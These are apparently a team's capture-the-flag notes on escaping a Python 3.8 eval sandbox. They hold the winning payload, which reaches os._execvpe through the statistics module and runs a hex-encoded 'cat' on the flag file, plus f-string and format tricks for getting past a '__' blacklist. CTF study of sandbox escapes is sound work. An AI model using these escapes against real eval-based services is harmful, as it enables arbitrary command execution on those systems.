## Calc.exe
> **Category:** Misc
> **Description:** 
> **Pad Link:** http://34.87.94.220/pad/misc-calcexe
> **Flag:**
---

## References
https://stackoverflow.com/questions/35804961/python-eval-is-it-still-dangerous-if-i-disable-builtins-and-attribute-access

Python 3.8

> statistics.random._os._execvpe
statistics.random._os._execvpe = <function _execvpe at 0x7f0884779790>

> statistics.random._os._execvpe('\x63\x61\x74',['\x63\x61\x74','\x66\x6c\x61\x67\x5f\x36\x61\x38\x61\x38\x32\x34\x31\x36\x34\x66\x39\x31\x35\x39\x31\x64\x30\x35\x35\x30\x35\x63\x36\x31\x39\x66\x30\x36\x65\x38\x32'])
statistics.random._os._execvpe('\x63\x61\x74',['\x63\x61\x74','\x66\x6c\x61\x67\x5f\x36\x61\x38\x61\x38\x32\x34\x31\x36\x34\x66\x39\x31\x35\x39\x31\x64\x30\x35\x35\x30\x35\x63\x36\x31\x39\x66\x30\x36\x65\x38\x32']) = FLAG{yet-an0th3r-pyth0n-s4ndb0x}

FLAG{yet-an0th3r-pyth0n-s4ndb0x}


## Bugs
Allowed builtins:
- abs
- dict
- divmod
- float
- format
- int
- len
- max
- min
- pow
- range
- set
- str

`__` is blacklisted

Allowed modules:
- math
    - math.sin
    - math.cos
- statistics
    - statistics.bisect_right
    - statistics.math
    - statistics.exp
    - statistics.erf
    - statistics.median_high
    - statistics.median_low
    - statistics.median_grouped
    - statistics.mode
    - statistics.sqrt
    - statistics.stdev
    - statistics.random
    - statistics.random._os
        - statistics.random._os._execvpe
    - statistics._find_rteq
    - statistics._convert
    - statistics._isfinite
    - statistics._normal_dist_inv_cdf
    - statistics._ss
    - 
- datetime
    - datetime.datetime_CAPI
    - datetime.datetime
- py_compile (Not defined)
- sqlite3 (Not defined)
- test (Not defined)
    

```
> datetime
datetime = <module 'datetime' from '/usr/local/lib/python3.8/datetime.py'>
```

Crashed it: datetime.ctime()¶
![](https://i.imgur.com/QTfzexZ.png)

```
f"\u0061"
```

https://blog.csdn.net/qq_43390703/article/details/106231154

Execution path: ['/usr/local/bin', '/usr/local/sbin', '/usr/local/bin', '/usr/sbin', '/usr/bin', '/sbin', '/bin']

## Exploit Ideas

To make string:

```python=3.6
"a"+"b" = ab
"{:c}".format(0x41) = A
```

Use f-string to evaluate expressions

```py
eval('f"{().__class__.__base__}"', {'__builtins__': None}, {})
```

`int` is not blacklisted:

```
> int
int = <class 'int'>
```

```
f'''{int(f'{f"0"+f"x"+f"1"}',16)+1}'''
```

```
f'''{in t(1)}'''
```

```
f'''{f'{f"i"+f"n"+f"t"+f"("+f"1"+f"+"+f"1"+f")"}'}'''
```

Loops ok
~~~
> [i for i in range(5)]
[i for i in range(5)] = [0, 1, 2, 3, 4]
~~~

## Weird things

~~~
> {}['a']
{}['a'] = 'a'
~~~
but supposed to give:
~~~
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
KeyError: 'a'
~~~

~~~
> {}[]
{}[] = unexpected EOF while parsing (<string>, line 1)
~~~
but supposed to give:
~~~
  File "<stdin>", line 1
    {}[]
       ^
SyntaxError: invalid syntax
~~~

```
> {}[{}]
{}[{}] = unhashable type: 'dict'
```

```
> {'a':1}['a']
{'a':1}['a'] = 1
> {'a':1}['b']
{'a':1}['b'] = 'b'
```

```
> [i for i in ()]
I don't like this: in()
> 'a' in ('a',)
'a' in ('a',) = True
> in
in = unexpected EOF while parsing (<string>, line 1)
```

```
> {1}[1]
{1}[1] = <string>:1: SyntaxWarning: 'set' object is not subscriptable; perhaps you missed a comma?'set' object is not subscriptable
```

https://adamj.eu/tech/2020/06/17/why-does-python-syntaxwarning-for-object-is-not-subscriptable/

## Scripts

local debug - to dump properties:
~~~python
mod = datetime; print('\n'.join([i + ' => ' + repr(getattr(mod,i)) for i in dir(mod)]))
# replace mod = datetime to e.g. mod = statistics
~~~
